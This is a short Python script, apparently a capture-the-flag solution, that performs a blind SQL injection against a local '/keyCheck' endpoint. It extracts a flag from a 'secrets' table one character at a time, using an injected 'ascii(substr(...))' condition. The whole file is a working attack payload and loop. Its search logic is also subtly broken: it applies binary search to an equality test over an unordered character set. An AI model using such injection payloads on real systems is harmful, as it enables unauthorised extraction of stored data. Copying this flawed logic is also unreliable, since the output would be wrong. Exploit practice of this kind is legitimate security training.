import string
import requests


def exploit():
    url = "http://localhost:5002/keyCheck"
    payload = "notusedkey' or 1=if((select ascii(substr(data, {0}, 1)) from secrets)={1}, 1, 0)#"
    chars = string.printable
    params = {}
    flag = ""

    for i in range(0, 1024):  # 1024 is a tentative number of flag length
        # Perform binary search for each character in the flag
        low, high = 0, len(chars) - 1
        while low <= high:
            mid = (low + high) // 2
            params["key"] = payload.format((i + 1), ord(chars[mid]))
            r = requests.get(url, params)

            if r.text != "used":
                low = mid + 1
            else:
                high = mid - 1

        # If we couldn't find the character, stop searching
        if low >= len(chars):
            break

        flag += chars[low]
        print(flag)

    return flag


def main():
    exploit()


if __name__ == "__main__":
    main()
